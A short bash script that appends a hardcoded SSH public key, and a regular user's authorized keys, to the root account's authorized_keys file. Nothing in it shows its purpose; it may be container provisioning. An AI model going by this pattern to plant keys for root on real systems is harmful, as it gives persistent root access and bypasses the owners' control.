#!/bin/bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD1GIWfdZcxZnMWEL0NIo9GalXKtOL4XWuDcYW7NDieFICxnkq5BoZbWi7h6cwHbRRXOK8mAzLTa9i105iDGJeg0P8pRKo+GCqc+P2Yd9fU5QD3XJPPrGiKfkt8jTAXlD69i7EK+0+z+umej89P9J4xFS5HbUrvVCYLu2I8md9ur/tvbWkSzw9L63ibaDisBnisV3oPkSoUESj0EXdSqkdq9uN3+e5QSUfmKIWXl/zXy/++QaSLHGsjLCfk8bCloEvaipyRfnpXcncc/S8K+G7XPqWKGceI9KseIXy1yj+WCgCbymY4W0fAUg1leTkI9xkX/PKWswJczq+5dzjBYPrF root@ed5aa5214ce8" >> /root/.ssh/authorized_keys
cat /home/sysuser/.ssh/authorized_keys >> /root/.ssh/authorized_keys
